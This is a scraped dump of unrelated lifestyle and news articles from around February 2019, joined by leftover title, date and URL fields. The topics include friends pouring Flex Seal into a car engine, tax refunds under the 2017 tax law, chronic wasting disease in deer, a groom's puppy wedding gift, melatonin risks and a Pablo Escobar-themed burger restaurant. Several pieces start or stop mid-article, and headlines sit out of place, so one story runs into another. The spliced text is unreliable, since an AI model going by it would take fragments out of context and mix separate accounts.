Round 2.5 flex seal oil Orion laid out a plan B. He spelled out the plan: instead of revving the engine, the driver should ‘Gas’ on starting the car. The young driver in the car did as Orion instructed. This time, the car began to make some noise. It shows promising signs in the first place. The driver applied more gas twice the number of Orion’s exclamation, “Gas it!” The car pulsated for more than 5 seconds and then shuts down. Oh this was not going to work.



You win some, you lose some This was not the outcome they wanted with the flex seal. Though they were having a nice time in the experiment, laughing and goofing off they all understood this was a fail, the car was done with for good. So, The group set for yet another plan of action following the idea of Orion. One last shot! This one was just not giving them the result as expected. Their major point to prove was that the flex seal can be a replacement for engine oil. However, this was not the case. They thought they would be able to know what happens, after all they are all really good with cars and have lots of knowledge about cars.



Extra-Energy Boost This was the last shot to turn this experiment around. After this trial, the group may just call it to quits. It was already getting to the point that Berky was the grand master in the prediction. Even Orion commended Berky by saying, “It looks like you’re about to win this one.” In as much as there is still an idea, Orion was not ready to give in—at least not at the moment. The group had one last trial before admitting that Berky won. This idea could solve the problem. Part of the idea was to add more battery power to the car. Orion told Mariner that they would use his truck to jump up the power battery.



Batteries don’t help The group connected the flex seal car with Mariner’s truck with a jumper cable. They hoped that this would make the experiment work. They turned on the car but the engine started shaking violently. Using the skills as applied in the previous test, the car seemed to be working perfectly. Soon, within a short while, just like before, it developed a heart attack and died instantly. Now, it seemed like they had to pull out the white flag.



Berky the winner The group officially accepted defeat. Berky was now the winner. Nevertheless, as they looked at the bottom of the car, they found something strange. The flex seal was leaking out at the bottom of the car. That was a sign of the end of their quest. In conclusion, Orion gave a finishing comment on Berky’s victory by saying, “Now this is it, it’s officially dead, and it is officially leaking flex seal out of the bottom…” He even said that the group would have to treat Berky to a very nice chicken dinner that night.



Dealing with the result The group now acknowledged the facts that flex seal couldn’t replace engine oil of a leaking car. In fact, this one had destroyed the poor car. More damage than good! Hence, there was a need to set the car free from its bondage. They set to drain out the flex seal from the car. In a way, this was more fun for the group. Orion lamented that the stuff was so thick and it might take a while to drain it off completely. The group hoped that once the entire flex seal was out of the car, they would be able to get it to work.



When to give up While the drain off was still on, the guys gave it a try once more. They turned on the ignition hoping that it would work properly this time. Again, the engine sputtered for some seconds under immense pressure. Unfortunately, the car didn’t come on this time. By this time, they were certain that the car was now fully dead. Berky announced the time of death by saying, “There she went”, while Orion seconded with a wow!



Just too thick Mariner asked what lesson the group had learned in the exercise. Orion replied, “Flex seal literally ruins it. It’s too thick.” Why would anyone put in such an effort on something that may not produce a positive result? That the beauty of adventure. These guys put in all their effort in any experiment not minding the outcome. Success or failure, they still couldn’t leave their ideas on paper. In addition, they have other ideas yet ‘untamed’.



Reviewing the Concoction If they must execute the plan, they have to recycle the flex seal. They retrieved the used flex seal drained from the car and analyzed it for the next line of action. In trying to analyze the drained flex seal, they found out that the constituent contains little amount of gas. In other to understand what the concoction constituted, they need to examine it physically.



Good to Go A member in the group asked Orion to dip a stick into the concoction. When he noticed that the stick interacted with the concoction, the group was surprised. Orion said that they could honestly be flex-sealing tools with the leftover flex seal, the concoction. This statement implied that the flex seal was useful for other stuff even if it didn’t work as engine oil. Even as at that, they weren’t contented with the number of failures obtained—there is still a chance.



Again?! The plan was to jump start the car and pour in the recycled flex seal into the car slowly while it was running. That was what these geniuses did. The group struggled to jumpstart the car. The leader of the group, Orion started pouring the recycled flex seal into the car, a risky move. The group waited anxiously for the outcome, thirsting for adventure. ‘There had been countless failures, but it might probably work out just fine’, so they thought.



Damaging hour Negative! The outcome of their final struggle ended up in a dead end. It was more devastating than the previous trials. Chau said, “It’s a failure.” At this junction, they all concur to the fact that the car was truly dead. The group was prepared for the worst. They knew something of such magnitude might occur in the long run. The car was pretty much disposable as well. So, to get the fun rolling, they had to entertain themselves and the audience.



The Thirst for Destruction Nothing can deliver the car by this time. It was totally dead, as dead as a rock. The group decided to kick, punch and do all sort of thing in a way to further destroy the car. This is the best way to get the hand, legs and entire body busy as well as giving back to the car for disappointing them. Orion said that they should give in their best shot in the process. Chau gave the side mirror a massive kick while Berky body-slammed the top like he was wrestling an opponent in the WWE SmackDown Live.



Be a pro If someone is going to do these crazy experiments we would warn them to be careful. These guys were messing with an actual engine and things could have gone a lot worse. Something could have caused a fire or other hazards and they were very professional about it is they do it all the time. So the entertainment is at its peak but the danger exists, so be aware of that.



As seen on TV So where did these guys get the inspo to use flex seal? Well if you haven’t viewed the commercial this might be the first time you heard of this product but it has an impressive commercial that looked too good to be true and had people questioning just how strong this product was. The commercial used very convincing salesmen who showed the success of the product. The product also has a tape form that apparently can stop a very severe leak.",The end result of using Flex Seal as engine oil,

But not everyone is in for an unpleasant surprise. Many people are watching this tax season more closely than usual because it's the first time the Tax Cuts and Jobs Act is in effect for a full tax year. The new law, passed in December 2017, enacted a number of broad changes. It introduced new tax brackets, included an expanded child care credit and changed the way itemized deductions are factored in, for example. Unfortunately, 28 percent of Americans don't understand exactly what's different, and almost half have no idea how the changes affect their tax bracket. Adding to that confusion, refunds dropped 8.7 percent over the first two weeks of filing season, according to the Internal Revenue Service (IRS). Plus, the IRS is processing returns at a slower pace than usual, in large part due to the 35-day partial government shutdown. ""The law is so different, we may have a different pattern than in the past,"" Howard Gleckman, a senior fellow in the Urban-Brookings Tax Policy Center, tells CNBC Make It. ""This is not a normal year."" But while some Americans may see lower refunds, most tax experts expect the refund rate to stabilize. And for some, their tax refunds will be higher this year.

Families with kids will likely see the biggest refund

Those with children still living at home may see a bigger refund this year, Lynn Ebel, director at The Tax Institute at H&R Block, tells CNBC Make It. Especially if they live in low-tax states such as Texas, Washington and Wyoming. ""Families with children under 17, especially those who claim the standard deduction in 2017 and will claim it in 2018, are most likely to get a refund bigger than anticipated,"" Ebel says.

The child tax credit is a great boost for young families with children. Harlene Stevens CPA with accounting firm Nisivoccia LLP

Under the new law, families can deduct up to $2,000 per qualifying child, up from $1,000 previously. These are credits, so if you tax bill is $10,000 and you qualify for the maximum credit, your bill goes down to $8,000. Plus, up to $1,400 of the child tax credit is refundable this year. So even if you don't owe any money to the IRS, you can get that money back as a refund. ""The child tax credit is a great boost for young families with children,"" Harlene Stevens, a CPA with accounting firm Nisivoccia LLP, tells CNBC Make It. There's also a new, non-refundable $500 credit for other qualifying dependents who may not otherwise meet the requirements for the larger child tax credit. For example, if you have college-age children under 23 who are still living at home, or if you are supporting grandchildren, you can claim the credit. However, Ebel notes if you don't have children or dependents and you itemized your deductions in 2017, and plan to do the same in 2018, you will likely see a smaller refund. This set of Americans ""are one of the groups most at risk of owing instead of getting a refund,"" she says.

Look beyond just your refund

Lisa Greene-Lewis, a TurboTax expert and CPA, tells CNBC Make It that it's important to look at your total tax picture, and not just the refund. Many people are expecting to see more money in their pocket because five of seven tax rates have been lowered. But Green-Lewis says whether you see a bigger refund depends on your personal tax situation and if you appropriately adjusted your W-4 withholdings in 2018. An estimated 20 percent of taxpayers did not withhold enough throughout the year, Barry Kleiman, a CPA and principal at the tax firm Untracht Early, tells CNBC Make It. ""The majority of taxpayers who usually take the standard deduction may see more money in their pocket, but this does not necessarily mean it will show up in their refund; it could have shown up in their paycheck last year, their tax refund, or as a lower tax balance due,"" Greene-Lewis says. A single person making $50,000 per year, for example, would see a tax savings of $2,640 under the new standard deduction amount, as opposed to the $1,587.50 in savings under the old system. But more of the savings is likely in the taxpayer's paycheck last year, instead of coming back to them at tax time.

Show Caption Hide Caption What is chronic wasting disease? CWD is an always-fatal disease that leaves their brains full of holes. What is this always-fatal condition and how do people fight its spread? Wochit-All

As people wonder what might happen if humans eat meat from ""zombie"" deer, there is at least one group of people who already know.

On March 13, 2005, a fire company in Oneida County, New York, fed the meat of a deer that tested positive for chronic wasting disease to 200 to 250 people. The company didn't know the meat was from a diseased deer. Laboratory tests for one of the deer served came back positive for CWD later.

Because little was known about what happens to people who eat infected meat, the Oneida County Health Department monitored the group's health through a surveillance project. About 80 people who ate the venison agreed to participate. Together with the State University of New York-Binghamton, health experts checked in with the group of mostly white males over the course of six years to see whether they developed any unusual symptoms.

In a study published in the peer-reviewed medical journal Public Health, researchers found the group had ""no significant changes in health conditions."" They did report eating less venison after the whole ordeal. Otherwise, observed conditions, including vision loss, heart disease, type 2 diabetes, weight changes, hypertension and arthritis, were credited to old age.

""It’s the only study I’m aware of that has this progressive follow-up of a known point source contamination where we know the people ate a contaminated animal,"" researcher Ralph Garruto, professor of biomedical and biological sciences at Binghamton University, told USA TODAY.

Garruto said his team checks in with the group every two years and plans another follow-up in spring. Though he said the chance of symptoms appearing dwindles with time, there's a small possibility that someone might show signs of the disease.

""It only takes one case,"" he said.

There have been no reported cases of CWD in humans, but the Centers for Disease Control and Prevention and state wildlife offices urge hunters to take precautions in areas where the disease has been found in animals. In laboratory studies, CWD has been able to cross species.

Unless you still have the Fifty Nifty United States song from elementary school memorized, you probably can’t name all 50 states in less than five minutes. If you’ve ever actually tried to list all the states from memory, you know how hard it is. You’ll most likely fly through about 40 of them and then start to struggle. And if you don’t, then test your knowledge even more with the 24 state trivia facts everyone gets wrong.

Even if you drew out the entire U.S. map, accounting for all of the tiny states in New England and remembering to sketch out both Dakotas and Kansas, there’s still one that inevitably holds the total count at 49.

Nope, it’s not Hawaii or Alaska. That state is Missouri.

The results from Sporcle’s “US States Quiz” make it clear that Missouri is the most forgotten state. The quiz has been attempted by players more than 19 million times, and Missouri is the state the lowest percent of people guess correctly. Only 77.6 percent of players manage to remember it, compared to the 97.3 percent who list California or Texas. The four most-forgotten states behind Missouri are Connecticut, Minnesota, Massachusetts, and Nebraska. If you’re one of the few who remembered Missouri, try guessing the only letter that’s not in any U.S. state name.

The fact that so many people forget Missouri isn’t that surprising, though. Eight U.S. states start with the letter M—you’re bound to forget one of them. Being able to list Maine, Maryland, Massachusetts, Michigan, Minnesota, Mississippi, and Montana on your own already signals a pretty good memory.

Put yourself to the test. Do you think you can name all 50? If you’re forgetting a lot of states, don’t worry. These 50 facts about the 50 states should help you remember them all. If that doesn’t work, memorizing the lyrics to that catchy Fifty Nifty United States song should definitely do the trick. Good luck!",The U.S. State Everyone Forgets When Listing All 50,

Groom Stuns Bride With Most Amazing Wedding Gift
",22/02/2019 13:19,https://brain-sharper.com/social/bride-surprise-wedding-gift-tb/,"

Many married couples will look back on their wedding day as one of the best days of their lives. In 2017, one man was determined to make his wedding day one that he and his wife would never forget. She Never Saw It Coming Jeff Althoff thought of an incredible idea for a wedding gift for his bride, Jenna, describing the surprise as “the wedding gift of her dreams.” When he gave the gift to Jenna at the reception, the bride was lost for words…

She Surprised Him First This story heavily focuses on the surprise that Jeff gave to Jenna on their wedding day. However, it wasn’t just the groom who had a few tricks up his sleeve. On March 4, 2017, on the morning of their big day, Jeff woke up and found a huge surprise waiting for him downstairs. It turns out that his bride Jenna had given him a pre-wedding gift – a new set of golf clubs! Jeff certainly had his work cut out for him…

He Also Had A Surprise For Her Of course, Jeff was over the moon that Jenna had given him such a thoughtful surprise gift before the big day had even gotten well and truly underway. However, the bride had no idea that Jeff also had a surprise up his sleeve. The big difference was that Jeff’s gift for Jenna would arrive after the ceremony. However, the wedding surprise was simply the culmination of a love story that had been unfolding for the last few years…

Love At First Sight In order to feel the weight and emotion of this epic wedding surprise, we need to understand the nature of Jeff and Jenna’s relationship. Based on their social media life, it appears that the couple has been together since 2013. Consistently sharing their happy moments online, Jenna and Jeff are obviously very proud of their love for one another. One thing is for sure though; you might be surprised by some of the passions that they enjoy together…

Playing Outdoors Ever since first falling in love a few years back, Jenna and Jeff have been thick as thieves and have developed some pretty interesting hobbies together. They love nothing more than being in the outdoors and performing outdoor activities such as hunting, skiing, and fishing. You might be asking yourself, “how is this relevant to the story?” Well, it turns out that their shared love for hunting is what put this remarkable story into motion, to begin with…

Unexpected Proposal One day, when Jeff took Jenna out for an impromptu hunting trip, she didn’t think too much of it. However, when she saw a professional photographer creeping up behind them, she knew that something was up. Suddenly, Jeff got down on one knee and asked Jenna for her hand in marriage. Without haste, Jenna said yes. She was more than ready to tie the knot with the man of her dreams. This was one hunting expedition that they’d never forget.

Beautiful Ceremony Fast forward a few months later and Jenna and Jeff’s big day had finally arrived. For many, the most nerve-wracking part of a bride and groom’s wedding is the actual ceremony. Everybody wants to recite their vows perfectly and to ensure that nothing gets in the way of the perfect ceremony. Thankfully for Jenna and Jeff, their ceremony was absolutely perfect. However, Jeff had more than just the ceremony on his mind. Keeping this big secret from Jenna was stressing him out a little…

Caught It All On Camera In order for them to be able to look back on this epic surprise, Jeff hired a film crew to record the entire thing. This included the behind-the-scenes footage, as well as the actual revelation later on. The video, which was eventually uploaded onto YouTube, starts with Jeff planning the surprise for his bride, Jenna. “Ok, so later tonight, I will be surprising Jenna with the wedding gift of her dreams,” Jeff said. But that was just the start…

Little Help From My Friends After announcing his plans on video, Jeff gathered his groomsmen around him and gave a little announcement to update them about his plans. It was mainly just to thank them for being by his side on his big day. “First off, I’d like to thank each and every one of you guys for being a part of my big day,” he said. “I really appreciate you guys taking the time to be here.” Then, he shared with them his plans for Jenna…

Stay Tuned! At first, Jeff referred to the surprise as “the wedding gift of her dreams.” You could tell though that the groomsmen were dying to know what the surprise was going to be. “With that being said, I’m going to tell you guys what the big surprise is,” he said. “She’s not going to know that you guys know until she sees this video later. So, are you guys ready to know it?” However, Jeff then turned around and simply said, “stay tuned!”

The Moment Of Truth So the wedding reception was in full swing and family and friends alike were enjoying the drinks and a wonderful spread of food. While Jenna was having the time of her life, she kept suspecting that Jeff had something planned. This is because he seemed extremely preoccupied. Then, when the time came for speeches, Jeff stood up, grabbed the microphone and started to speak. However, the crowd could hear it in his words that Jeff was a little nervous…

Nervous Speech There is no denying that Jeff’s speech got off to a bit of bumpy start. “First off, on behalf of both of Jen and I, we would like to thank each and every one of you for coming out and celebrating our big day,” he said. However, Jeff had a good reason as to why he was suffering from a case of the jitters. “I’m a little nervous up here right now because I’m about to give Jenna a big surprise that she doesn’t know about…”

Beautiful Bride It was at this point that Jeff asked Jenna to proceed to the front of the reception. As she walked down in her stunning lace dress, Jeff commented on her beautiful looks. “So if you could come out front here, please, thank you,” he said. “Would each and every one of you guys agree with me that she is the most beautiful bride that you guys have ever seen?” Then, Jeff decided to cut to the chase and set up his big surprise…

Special Gift While family and friends alike had been speculating that Jeff was cooking up a surprise for Jenna, the groom wanted to set the record straight, once and for all. “I’ve heard a few rumbles and a few jokes about it along the way,” he said. “But Jenna, I’ve decided to give you a wedding gift that was completely for you. No, it’s not hunting or fishing related. It’s everything that you want.” However, Jeff’s clues only seemed to get more cryptic…

Best Day Of Our Life Before making things clearer in regards to his surprise, Jeff asked his bride a puzzling question: “Would you agree with me that the last few hours have been the best hours of your life as a family of two?” Despite being slightly confused by the question, Jenna did agree with Jeff and gave him a little nod. Nevertheless, she trusted that Jeff would make things a little clearer as his speech progressed. However, his next line only made things more confusing!

Strange Announcement Hoping that Jeff would be able to dig himself out of this confusing hole he created, Jenna was surprised by the next thing that her husband said: “Well, I’m proud to announce that we have now become a family of three!” What could this possibly mean? Was she pregnant and she didn’t know about it? Soon enough though, her questions would be answered. It seems that their family and friends caught on to Jeff’s clues before the bride did…

Guests Were In Shock While Jenna tried to decipher Jeff’s cryptic hints about the surprise, many of guests had already caught a glimpse of the incredible wedding gift. As soon as they laid eyes on it, the guests started to gasp and clap with thunderous applause. Some people were so shocked that their jaws completely dropped to the ground. Jenna had no idea what was going on. However, it wouldn’t take long before Jenna also saw what all the fuss was about…

She Couldn’t Believe It Although she was still unaware of what all the fuss was about, all Jenna needed to do was turn her head and everything would make sense. So she did and in the blink of an eye, she was completely lost for words. All of the guests applauded even louder when they saw Jenna’s amazing reaction. Naturally, Jeff was absolutely delighted by his wife’s reaction. But what exactly was it that gave the bride the shock of her life?

It’s A Puppy! Lo and behold, Jeff’s surprise wedding gift for Jenna was a puppy! Overwhelmed with emotion, Jenna ran over to the adorable light-brown Labrador. Jeff picked up the little pup and softly placed him in her arms. She gave him the biggest hug and shortly after that, planted a huge smacker on Jeff! Now that Jeff’s surprise went down absolutely perfectly, everyone could enjoy the rest of the party, puppy included! However, it’s what happened next that took this story to another level…

Viral Sensation When everything was said and done, Jeff took the video of the surprise and uploaded it onto the YouTube. Not even the groom could have anticipated the love he was about to receive for the heartwarming clip. In no time at all, the video generated over 700,000 views on YouTube and also got a ton of likes on Facebook. “Amazing video, amazing gift, amazing reaction! Congratulations Jeff and Jenna!! Looked like a beautiful wedding!” one person wrote. But that wasn’t the end of this remarkable story…

Honeymoon Time! While their surprise puppy was, without a doubt, the highlight of their wedding, Jenna and Jeff would have to sideline their dog for at least a couple of weeks. This is because they wanted to go on their honeymoon. After leaving their pup in safe hands, the newlyweds embarked on a beautiful honeymoon to Saint Maarten, an island in the Caribbean. Despite enjoying every minute of their honeymoon, Jenna and Jeff were excited to return home to their beautiful puppy, “Bear.”

Family Of Three… Jenna, Jeff, and Bear acclimatized to life as a family of three in no time. Having been there literally from day one, Bear was very much family, as far as the newlyweds were concerned. Jenna documented Bear’s early years on Facebook, posting pictures of him having fun in the pool, sleeping, and exploring. Believe it or not, Bear also loves the outdoors. And just when you thought that the surprises were over, another one was just around the corner…",Groom Stuns Bride With Most Amazing Surprise Wedding Gift,

Show Caption Hide Caption What is chronic wasting disease? CWD is an always-fatal disease that leaves their brains full of holes. What is this always-fatal condition and how do people fight its spread? Wochit-All

Many hunters and wildlife experts have found the latest headlines around the ""zombie"" deer disease bizarre, as they say chronic wasting disease has been around for years – and they wouldn't describe infected animals as ""zombies.""

In fact, many infected deer don't even reach the final stage of the disease, where they show symptoms (stumbling, drooling, extreme weight loss), said Lindsay Thomas Jr., director of communications for the Quality Deer Management Association, a wildlife conservation organization.

He said it's ""baffling"" to think of a deer dying from CWD as a frightening ""zombie."" He instead compares the disease to dementia, as infected animals appear more confused than threatening.

“These animals aren’t zombies,” said Bryan J. Richards, emerging disease coordinator at the U.S. Geological Survey’s National Wildlife Health Center. “They are ready to die. They are very sick.”

While the term could give the general public the wrong impression about CWD,

Krysten Schuler, wildlife disease ecologist and co-director at the Cornell Wildlife Health Lab, said the disease is ""a big problem"" and she's glad more people are paying attention to it. People just need to be properly informed, she said.

CWD, which is fatal to all deer that contract it, was first identified in the 1960s, and is now in 24 states across the nation. It's a serious infectious disease in animals, but likely won't spark an apocalypse.

Here's why:

Many appear totally normal.

Infected deer could easily die from another cause (killed by a predator or car) before they show CWD symptoms such as drooling, listlessness and low weight, Thomas said. Deer, elk and moose with the disease might appear healthy for up to two years, as neurological symptoms develop slowly, according to the Chronic Wasting Disease Alliance. Symptoms usually only show during the last few months before death.

""You cannot eyeball a deer and say if it has CWD,"" Thomas said, noting that hunters have shot infected animals, believing they are healthy, only to find out through testing that their deer has CWD.

They probably won't attack.

Deer with CWD aren't going to eat your brains. They actually have holes in their brains that might cause them to be less coordinated and have trouble walking, Thomas said. Deer in the final stage of CWD could also appear weak, and underweight.

While hunters should be aware if the disease is prominent in their area, there's no need to fear ""zombie"" deer and avoid hunting, Schuler said. If anything, people who spot a sickly deer should call local wildlife officials so that the deer can be tested, she said.

None have infected humans.

There have never been any reported cases of CWD in humans. But, studies have shown it can be transmitted to animals other than deer, moose and elk, according to the Chronic Wasting Disease Alliance. Michael Osterholm, director of the Center for Infectious Disease Research and Policy at the University of Minnesota, told USA TODAY that it's possible humans could contract the disease in the future. So, it is important to take precautions in infected areas. The most likely way humans could become infected is if they eat infected deer meat, the Centers for Disease Control and Prevention says. Here are a few ways people can avoid CWD.

This Woman Saved $100,000 in 3.5 Years on a $54,000 Salary.
Here's How
",20/02/2019 10:50,https://money.com/bola-sokunbi-clever-girl-finance/,"After graduating from college in 2004, Bola Sokunbi challenged herself to save as much as possible. She had admired the way her mother became a “hustle queen,” jumping into business after staying home to raise four children, and she wanted to start laying her own financial foundation.

Working as a tech consultant in New York City from 2004 to 2008 before she was married, she managed to save 40% to 50% of her $54,000 annual salary. Sokunbi, who grew up in Austria and Nigeria, educated herself about the American retirement savings system along the way. One book that particularly influenced her was Smart Women Finish Rich by David Bach. “I read that book to shreds,” she says.

Today, Sokunbi, 36, is an influencer herself. She quit her consulting job two years ago to focus full-time on running Clever Girl Finance, her financial education site for women. She has 4-year-old twins and lives with her husband, a doctor, in Hunterdon County, N.J.

Here, she shares insights into her aggressive savings plan.

Set Your Intentions

None of Sokunbi’s friends were saving as aggressively as she was right out of college. Some were making twice what she earned and saving nothing at all. But that didn’t faze her. “For me, it was setting intentions and wanting to do it,” she says. It helped that Sokunbi didn’t have student loan debt. Her mother paid for her college education, which she began in Austria and finished in the U.S.

Another tailwind was the fact that she didn’t have much time to spend money. She travelled a lot for work during the week and began a side gig as a wedding photographer on the weekends. Not only did her two jobs take up a lot of time, but they also took care of most of her meals: her company would foot the tab for her food when she was on the road, and she’d also eat at weddings as part of her compensation. When she was left to her own devices, “I was pretty much buying ramen noodles and Coke, my guilty pleasure,” she says.

She enjoyed getting to work early and reading personal finance blogs over her breakfast of a free company bagel. She loved seeing how Mr. Money Mustache and others approached investing and calculating their income in early retirement, but she didn’t necessarily aspire to follow in their footsteps and reach FIRE, an acronym for financial independence, retire early.

Find Your True Voice

Sokunbi launched Clever Girl Finance when her twins, a girl and a boy, were one year old. She developed it on the side for a year while working full-time, often staying up until 3 a.m. “I was exhausted all the time,” she says.

But her efforts paid off. The blog earned $25,000 that first year, through a diverse revenue stream of one-on-one coaching, courses, ebooks, affiliate links and eventually, brand partnerships. Two years ago, Sokunbi quit her consulting job to focus on the business full time.

Her main audience is women of color ages 21 to about 38. She realizes that many of them grew up in houses where money was a source of silent stress, and she wants to bring the discussion out into the open. “Having the conversation is necessary,” she says.

Personal finance isn't a regular part of the curriculum in most U.S. schools, so Sokunbi has picked up the slack and educates her readers about budgets and investing. Her motto is, “no shame, no judgment.”

Invest Strategically

Sokunbi learned early on that sometimes you have to spend money to make more money. She started out photographing weddings for free to build a portfolio. She had only basic camera equipment at first, but then “every time I made money I bought a lens or a camera body,” she says.

Eventually, her camera equipment was worth about $15,000 but immediately improved the quality of her photographs and allowed her to start charging between $3,000 and $5,000 a wedding. Sokunbi’s photography income padded her savings and the income from her job, which grew to $100,000 in three and a half years.

Sokunbi reached a similar juncture with Clever Girl Finance a year ago. Realizing that she couldn’t do everything herself, she hired two part-time workers to help schedule her content and tackle other administrative tasks. Their salary is an investment, but it’s one that translates into increased revenue for the site.

Sokunbi still saves as much as she can these days. She and her husband max out their contributions to their retirement accounts and put as much as they can, currently $10,000 a year each, into their children’s 529 college savings accounts. They would like to pay their children’s tuition in full, just like Sokunbi’s mother did for her.

While she has cut back her workload a bit this summer to spend more time with her twins, Sokunbi usually spends more than 40 hours a week on Clever Girl Finance. “It’s almost like, ‘why did I quit my job again?’” she laughs. “But I love it.”

Johnny, who runs Instagram account @cakemail, has shared a hack that is so simple, we wonder why we haven’t been doing this the whole time.

He says that if you order fries from McDonald’s and ask for them without salt on, they will be cooked fresh as all the fries that are ready to go will have salt on them already.

This content is imported from Instagram. You may be able to find the same content in another format, or you may be able to find more information, at their web site.

So, asking for fries without salt is a foolproof way of getting the freshest, hottest chips possible.

To prove his point, Johnny ordered two lots of fries – a normal portion and a portion without salt. He tested the temperature of both portions, and the saltless ones were much hotter.

Obviously, if you’re into salty chips, you’ll then have to add your own when you get home. Or, if you’re eating on the go, you may need to carry salt sachets around in your handbag.

But seeing as this is a judgment-free zone, you do you.

The company has gotten its share of celebrity endorsements, too: Warren Buffett says he's a ""Coke loyalist,"" and Berkshire Hathaway is a longstanding investor.

If you invested in the company 10 years ago, that decision could have paid off. According to CNBC calculations, a $1,000 investment in Coca-Cola in 2009 would be worth more than $2,800 as of Feb. 15, 2019.

While the company's stock price has been largely steady over the past decade, though, any individual stock can over- or underperform, and past returns do not predict future results.

CNBC: Coca-Cola stock as of Feb. 15, 2019

Shares fell Thursday and were on track for their worst day since the Great Recession. The company's stock price fell 7.5 percent and its net sales fell 6 percent. (Net sales still topped expectations.)

Chief executive officer James Quincey told analysts that currency fluctuations, Federal Reserve interest rate hikes and changing tax rates could be responsible for the stock's slide. ""Clearly, that is leading to an [earnings per share] growth that is not what we aspire to,"" he said.

He expressed similar concerns at the 49th World Economic Forum in Davos: ""I think we are in the phase of 2019 where we are likely to see a little less growth. It is going to be a slightly tougher year in macroeconomic terms and we need to work our way through it.""

Some analysts see problems facing the traditional soda market overall. Ivan Feinseth, of financial firm Tigress Financial Partners, said on CNBC's ""Squawk Box,"" that ""there is no growth in carbonated soda,"" and that brands like Coke and longtime rival Pepsi need to get creative.

They'll need to ""continue to develop or acquire other alternatives,"" Feinseth explains, like sparking water, flavored seltzers, teas and sports drinks, since ""that's where the growth is, in the niche beverage markets.""

Coca-Cola does offer products besides sodas, and it continues to diversify its portfolio. The company made six new acquisitions in 2018, among them coffee chain Costa Coffee. They also own popular beverage brands Dasani, Minute Maid and Powerade.

And Quincey said on CNBC's ""Squawk on the Street"" that the company will take time to ""absorb"" the investments it made last year.","If you invested $1,000 in Coca-Cola 10 years ago, here's how much you'd have now",

Read This If You Take Melatonin To Sleep At Night

The popular sleep supplement is almost totally unregulated.
",16/02/2019 15:51,https://www.huffpost.com/entry/melatonin-dosage-and-risks_n_56deff8ce4b03a40567a1e1e,"Melatonin is a very popular sleep aid. It’s naturally produced in your body. You don’t need a prescription for it and can buy it in gummy form or in a fruity drink. But is it as effective and safe as we think?

Natural melatonin, a hormone produced by the pineal gland, helps humans fall asleep ― and synthetic melatonin has been available as a sleep aid for nearly three decades. But the synthetic version’s effects have not been extensively studied, and since it’s classified as a “dietary supplement,” it is almost completely unregulated by the FDA.

It’s important to take a closer look at this common supplement. “Any person in the sleep world will tell you the same thing: melatonin is not harmless, is vastly overused and should not be used as a sleep aid to treat insomnia,” Michael Grandner, a sleep researcher at the University of Arizona, told HuffPost.

How it works

Advertisement

Melatonin is meant to reset the body’s internal clock ― for example, it’s appropriate to use the supplement to counter the effects of jet lag, or help someone sleep if they have an unusual work schedule or suffer from a circadian rhythm disorder. It should not be used for general insomnia.

The proper dosage, according to a seminal 2001 study from the Massachusetts Institute of Technology, is 0.3 milligrams. The research was conducted by Richard Wurtman, who pioneered the pharmaceutical use of melatonin as a sleep aid in 1994. Pills and supplements often sell 10 times that suggested amount in a single dose. This can lead to higher plasma melatonin levels the next day, which can cause a “hangover” effect that leaves users groggy.

“Any person in the sleep world will tell you the same thing: Melatonin is not harmless, is vastly overused and should not be used as a sleep aid to treat insomnia.” - Michael Grandner, University of Arizona

According to a 2005 meta-analysis of melatonin studies from MIT, also led by Wurtman, researchers found that the widely available high doses of melatonin are ineffective. “After a few days, it stops working,” wrote Wurtman, in a press release accompanying the study. When the brain’s melatonin receptors are exposed to too much of the hormone, they become unresponsive, he said.

Safety concerns

Melatonin may also be unsafe for children. David Kennaway, the director of the circadian physiology lab at the University of Adelaide in Australia, told Science Daily that the use of melatonin to treat children’s sleep disorders is “rather alarming.”

He said there is “extensive evidence from laboratory studies that melatonin causes changes in multiple physiological systems, including cardiovascular, immune and metabolic systems, as well as reproduction in animals,” and its effects on children’s developing bodies is yet unstudied.

“The word ‘safe’ is used very freely and loosely with this drug,” said Kennaway, “but there have been no rigorous, long-term safety studies of the use of melatonin to treat sleep disorders in children and adolescents.”

Even for adults, the unregulated nature of the supplement gives cause for reconsideration. Although synthetic melatonin is “chemically identical” to natural melatonin, commercially available supplements “often contain fillers, inert and other ingredients that may cause effects that would not be expected with natural melatonin,” Clete Kushida, a sleep researcher at Stanford University School of Medicine, told HuffPost in an email.

“This is a concern that clinicians should relay to patients, especially since the contents of the supplements are not regulated by the FDA,” said Kushida. “And since it’s not regulated by the FDA, the long-term effects/consequences have not been studied in a controlled and systematic manner.”

“The word 'safe' is used very freely and loosely with this drug.” - David Kennaway, University of Adelaide

The verdict

So why do people still use it?

“Unfortunately, it’s acquired a reputation as a safe, ‘natural,’ over-the-counter quick-fix for sleep that will be hard to shake,” said Grandner.

That conviction may explain why melatonin is so popular even though it’s apparently not that effective.

Consumer Reports said melatonin supplements helped users fall asleep “only 7 minutes faster and sleep 8 minutes longer on average,” according to a 2013 analysis. And the same report notes that “about 20 percent of users in our survey reported next-day grogginess,” and recommended that users exercise caution before driving the next day.

“Melatonin is not an insomnia cure,” Grandner emphasized. “The main reasons regular people find it hard to sleep ― tossing and turning, ruminating in bed ― will not be affected by melatonin.” He suggested that the vast majority of people who struggle to fall asleep would be better served by establishing a consistent routine, practicing good sleep hygiene in the bedroom and getting lots of daytime light exposure.",Read This If You Take Melatonin To Sleep At Night,

While many people found the concept amusing, the burger and restaurant ruffled a fair few feathers, with one person writing on the restaurant's Facebook page: ""NOT FUNNY. NOT OKAY.""

""I'd like to see someone try and explain that to their kid who just wants to eat a burger?"" another Facebooker commented.

Someone else said: ""How can we explain (to) you people that IT ISN'T FUNNY? Try to do that with Hitler and see what happens. Use your brain folks.""

But owner Vaughan Marks has denied claims that the restaurant and its menu celebrates or makes light of notorious drug kingpin Pablo Escobar, asserting the name merely alluded to Escobar, rather than 'glorifying' him.

He's also explained he won't be changing the name of the restaurant - that is unless everyone manages to raise $100 million for charity.

Speaking to SBS Spanish, he said: ""If it hurts so much and they want us to change the name, then let's do it for a reason, if we can gather all those who are against the name, and work as a team to raise $100 million for a charity of their choice, then if we can raise that amount of money, we will change the name, that makes sense to me.

Marks continued: ""There has always been a fascination for films like Blow or Scarface, so we thought that the name we gave to our business could be appropriate, and the name is a point of difference.

""It's not his name, Pablo's Escoburgers is just a play on words, I do not defend Pablo and I do not want to glorify him, I think he was a horrible person, but it occurred to us to play with words, because it sounded funny, but this does not mean that Pablo is funny or that everything he has done is funny.""

Marks says his establishment has been given a 2-star rating on Facebook because, he claims, a bunch of angry Colombians downvoted him for glorifying Escobar.

